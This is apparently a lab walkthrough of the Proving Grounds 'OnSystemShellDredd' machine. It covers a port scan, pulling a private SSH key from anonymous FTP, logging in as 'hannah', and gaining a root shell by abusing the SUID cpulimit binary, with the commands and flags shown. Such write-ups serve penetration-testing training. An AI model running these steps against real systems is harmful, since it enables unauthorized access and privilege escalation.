###### tags: `Offsec` `PG Play` `Easy` `Linux`

# OnSystemShellDredd
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.215.130 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.215.130:21
Open 192.168.215.130:61000

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
```

ftp登入，`ls -al`查看到有一個`.hannah`資料夾，進去得到一個`id_rsa`檔案
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.215.130 

ftp> ls -al
229 Entering Extended Passive Mode (|||20060|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah

ftp> cd .hannah
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||23326|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa

ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||47435|)
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
100% |****************************************************************************************************************************|  1823        1.47 MiB/s    00:00 ETA
226 Transfer complete.
```

ssh登入hannah的帳號，`/home/hannah`得到local.txt
```
┌──(kali㉿kali)-[~/pgplay/OnSystemShellDredd]
└─$ ssh -p 61000 -i id_rsa hannah@192.168.215.130

hannah@ShellDredd:~$ cat local.txt
7dae7512079d14638d33133eb3250e5f
```

找binaries，用[GTFOBins](https://gtfobins.github.io/gtfobins/cpulimit/#suid)，在`root`找到proof.txt
```
hannah@ShellDredd:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd

hannah@ShellDredd:~$ install -m =xs $(which cpulimit) .
hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p

# # whoami
root
# cat proof.txt
d3b5bc7509b9e57d0c2c1a9245aeb714
```